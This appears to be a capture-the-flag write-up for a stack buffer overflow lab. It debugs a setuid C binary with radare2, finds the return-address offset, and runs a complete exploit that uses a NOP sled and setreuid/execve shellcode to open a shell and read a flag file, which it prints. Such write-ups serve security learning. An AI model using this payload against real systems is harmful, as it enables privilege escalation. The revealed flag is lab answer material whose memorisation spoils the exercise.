
The files:
```sh
[user1@ip-10-10-145-36 overflow-4]$ ls -la
total 20
drwxrwxr-x 2 user1 user1   76 Sep  3  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
```

The code:
```c
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
```

Checking for buffer overflow:
```sh
[user1@ip-10-10-145-36 overflow-4]$ r2 -d -A buffer-overflow-2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Process with PID 13409 started...
...

[0x7ffff7dd9ef0]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x00400650    1 2            sym.__libc_csu_fini
0x00400654    1 9            sym._fini
0x00400527    1 133          sym.concat_arg
0x00400440    1 6            sym.imp.strcat
0x00400430    1 6            sym.imp.printf
0x004005e0    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x004005ac    1 41           main

[0x7ffff7dd9ef0]> pdf @main
┌ 41: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x40046d
│           0x004005ac      55             push rbp
│           0x004005ad      4889e5         mov rbp, rsp
│           0x004005b0      4883ec10       sub rsp, 0x10
│           0x004005b4      897dfc         mov dword [var_4h], edi     ; argc
│           0x004005b7      488975f0       mov qword [var_10h], rsi    ; argv
│           0x004005bb      488b45f0       mov rax, qword [var_10h]
│           0x004005bf      4883c008       add rax, 8
│           0x004005c3      488b00         mov rax, qword [rax]
│           0x004005c6      4889c7         mov rdi, rax
│           0x004005c9      e859ffffff     call sym.concat_arg
│           0x004005ce      b800000000     mov eax, 0
│           0x004005d3      c9             leave
└           0x004005d4      c3             ret

[0x7ffff7dd9ef0]> pdf @sym.concat_arg
┌ 133: sym.concat_arg (int64_t arg1);
│           ; var int64_t var_a8h @ rbp-0xa8
│           ; var int64_t var_a0h @ rbp-0xa0
│           ; var int64_t var_98h @ rbp-0x98
│           ; var int64_t var_90h @ rbp-0x90
│           ; arg int64_t arg1 @ rdi
│           ; CALL XREF from main @ 0x4005c9
│           0x00400527      55             push rbp
│           0x00400528      4889e5         mov rbp, rsp
│           0x0040052b      4881ecb00000.  sub rsp, 0xb0
│           0x00400532      4889bd58ffff.  mov qword [var_a8h], rdi    ; arg1
│           0x00400539      48b8646f6767.  movabs rax, 0x6f67676f64    ; 'doggo'
│           0x00400543      ba00000000     mov edx, 0
│           0x00400548      48898560ffff.  mov qword [var_a0h], rax
│           0x0040054f      48899568ffff.  mov qword [var_98h], rdx
│           0x00400556      488d9570ffff.  lea rdx, [var_90h]
│           0x0040055d      b800000000     mov eax, 0
│           0x00400562      b911000000     mov ecx, 0x11               ; 17
│           0x00400567      4889d7         mov rdi, rdx
│           0x0040056a      f348ab         rep stosq qword [rdi], rax
│           0x0040056d      4889fa         mov rdx, rdi
│           0x00400570      668902         mov word [rdx], ax
│           0x00400573      4883c202       add rdx, 2
│           0x00400577      488b9558ffff.  mov rdx, qword [var_a8h]
│           0x0040057e      488d8560ffff.  lea rax, [var_a0h]
│           0x00400585      4889d6         mov rsi, rdx
│           0x00400588      4889c7         mov rdi, rax
│           0x0040058b      e8b0feffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00400590      488d8560ffff.  lea rax, [var_a0h]
│           0x00400597      4889c6         mov rsi, rax
│           0x0040059a      bf70064000     mov edi, str.new_word_is__s ; 0x400670 ; "new word is %s\n"
│           0x0040059f      b800000000     mov eax, 0
│           0x004005a4      e887feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004005a9      90             nop
│           0x004005aa      c9             leave
└           0x004005ab      c3             ret

[0x7ffff7dd9ef0]> db 0x4005ab
[0x7ffff7dd9ef0]> dc
new word is doggoAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
hit breakpoint at: 4005ab

[0x004005ab]> dr
rax = 0x00000206
rbx = 0x00000000
rcx = 0x00000000
rdx = 0x00000000
r8 = 0x000001f9
r9 = 0x7fffffffe0d0
r10 = 0x00602465
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe270
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe178
rbp = 0x4133664132664131
rip = 0x004005ab
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x004005ab]> pxa @rsp-200
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe0b0  0000 0000 0000 0000 a905 4000 0000 0000  ..........@.....
0x7fffffffe0c0  68a2 fff7 ff7f 0000 d3e4 ffff ff7f 0000  h...............
                 /r9                                                    
0x7fffffffe0d0  646f 6767 6f41 6130 4161 3141 6132 4161  doggoAa0Aa1Aa2Aa
0x7fffffffe0e0  3341 6134 4161 3541 6136 4161 3741 6138  3Aa4Aa5Aa6Aa7Aa8
0x7fffffffe0f0  4161 3941 6230 4162 3141 6232 4162 3341  Aa9Ab0Ab1Ab2Ab3A
0x7fffffffe100  6234 4162 3541 6236 4162 3741 6238 4162  b4Ab5Ab6Ab7Ab8Ab
0x7fffffffe110  3941 6330 4163 3141 6332 4163 3341 6334  9Ac0Ac1Ac2Ac3Ac4
0x7fffffffe120  4163 3541 6336 4163 3741 6338 4163 3941  Ac5Ac6Ac7Ac8Ac9A
0x7fffffffe130  6430 4164 3141 6432 4164 3341 6434 4164  d0Ad1Ad2Ad3Ad4Ad
0x7fffffffe140  3541 6436 4164 3741 6438 4164 3941 6530  5Ad6Ad7Ad8Ad9Ae0
0x7fffffffe150  4165 3141 6532 4165 3341 6534 4165 3541  Ae1Ae2Ae3Ae4Ae5A
0x7fffffffe160  6536 4165 3741 6538 4165 3941 6630 4166  e6Ae7Ae8Ae9Af0Af
                                     /rsp                               
0x7fffffffe170  3141 6632 4166 3341 6634 4166 3541 6636  1Af2Af3Af4Af5Af6
0x7fffffffe180  4166 3741 6638 4166 3941 6730 4167 3141  Af7Af8Af9Ag0Ag1A
0x7fffffffe190  6732 4167 3341 6734 4167 3541 6736 4167  g2Ag3Ag4Ag5Ag6Ag
0x7fffffffe1a0  3741 6738 4167 3941 6830 4168 3141 6832  7Ag8Ag9Ah0Ah1Ah2

[0x004005ab]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
```

Again we don't get the address and the ret address is not poped from the stack and put in rip.

We can see the next data on stack though:
```
                                     /rsp                               
0x7fffffffe170  3141 6632 4166 3341 6634 4166 3541 6636  1Af2Af3Af4Af5Af6
```

Accounting for endianness it becomes: 3666413566413466

Let's find the position:
```sh
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3666413566413466
[*] Exact match at offset 163
```

Let's use the exploit we used in overflow-3 as this also is a suid binary with a buffer overflow vulnerability.

overflow-3 exploit:
```sh
./buffer-overflow $(python -c "print('\x90'*(152-14-40-10)+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'\x80\xe2\xff\xff\xff\x7f\x00\x00')")
```

let's replace the address with Bs to confirm the position and also check for a correct address
we also need to update the position to 163 instead of 152
also we replace `\xea\x03` to `\xeb\x03` since the user with permissions has id 1003
Also the executable name lol!
```sh
./buffer-overflow-2 $(python -c "print('\x90'*(163-14-40-10)+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'BBBBBBBB')")
```

Let's run this in r2 to get an address
```sh
[user1@ip-10-10-145-36 overflow-4]$ r2 -d -A ./buffer-overflow-2 $(python -c "print('\x90'*(163-14-40-10)+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'BBBBBBBB')")
Process with PID 18708 started...
...
[0x7ffff7dd9ef0]> db 0x4005ab

[0x7ffff7dd9ef0]> dc
new word is doggo���������������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�����������BBBBBBBB
hit breakpoint at: 4005ab
[0x004005ab]> pxa @rsp-200
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe200  0000 0000 0000 0000 a905 4000 0000 0000  ..........@.....
0x7fffffffe210  68a2 fff7 ff7f 0000 1ce6 ffff ff7f 0000  h...............
                 /r9                                                    
0x7fffffffe220  646f 6767 6f90 9090 9090 9090 9090 9090  doggo...........
0x7fffffffe230  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 31ff 66bf eb03 6a71  ........1.f...jq
0x7fffffffe290  5848 89fe 0f05 6a3b 5848 31d2 49b8 2f2f  XH....j;XH1.I.//
0x7fffffffe2a0  6269 6e2f 7368 49c1 e808 4150 4889 e752  bin/shI...APH..R
0x7fffffffe2b0  5748 89e6 0f05 6a3c 5848 31ff 0f05 9090  WH....j<XH1.....
                                     /rsp                               
0x7fffffffe2c0  9090 9090 9090 9090 4242 4242 4242 4242  ........BBBBBBBB
0x7fffffffe2d0  00e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2e0  e005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe2f0  0000 0000 0000 0000 c8e3 ffff ff7f 0000  ................

```

We select an address in the middle of the nops: `0x7fffffffe240`
We convert it (endianness and `\x`): `\x40\xe2\xff\xff\xff\x7f`

```sh
./buffer-overflow-2 $(python -c "print('\x90'*(163-14-40-10)+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'\x80\xe2\xff\xff\xff\x7f')")
```

```
[user1@ip-10-10-145-36 overflow-4]$ ./buffer-overflow-2 $(python -c "print('\x90'*(163-14-40-10)+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x90'*10+'\x80\xe2\xff\xff\xff\x7f')")
new word is doggo���������������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1����������������
sh-4.2$ ls -la
total 20
drwxrwxr-x 2 user1 user1   76 Sep  3  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
sh-4.2$ cat secret.txt
wowanothertime!!
sh-4.2$ exit
exit
[user1@ip-10-10-145-36 overflow-4]$
```